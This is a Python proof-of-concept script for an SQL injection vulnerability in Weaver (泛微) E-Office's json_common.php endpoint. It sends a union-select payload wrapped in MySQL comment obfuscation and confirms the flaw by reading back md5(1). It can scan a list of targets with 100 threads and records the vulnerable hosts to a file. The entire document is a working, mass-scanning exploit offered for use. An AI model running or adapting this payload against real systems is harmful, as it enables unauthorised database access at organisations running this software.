import argparse, requests, sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """泛微E-Office json_common.php SQL注入"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description='泛微E-Office json_common.php SQL注入漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str, help="input your url")
    parser.add_argument('-f', '--file', dest='file', type=str, help="input your path")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = "/building/json_common.php"
    headers = {
        'User-Agent': 'Mozilla/5.0(X11;Linuxx86_64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/41.0.2227.0Safari/537.36',
        'Connection': 'close',
        'Content-Length': '87',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept-Encoding': 'gzip'
    }
    data = "tfs=city` where cityId =-1 /*!50000union*/ /*!50000select*/1,2,md5(1) ,4#|2|333"
    try:
        response = requests.post(url=target + payload, headers=headers, data=data, verify=False, timeout=10)
        if response.status_code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in response.text:
            print(f"[+]{target}存在sql注入漏洞")
            with open('result.txt', 'a') as f:
                f.write(f"{target}存在sql注入漏洞\n")
        else:
            print(f"[-]{target} 不存在sql注入漏洞")
    except:
        print(f"{target}可能存在sql注入漏洞请手工测试")
if __name__ == '__main__':
    main()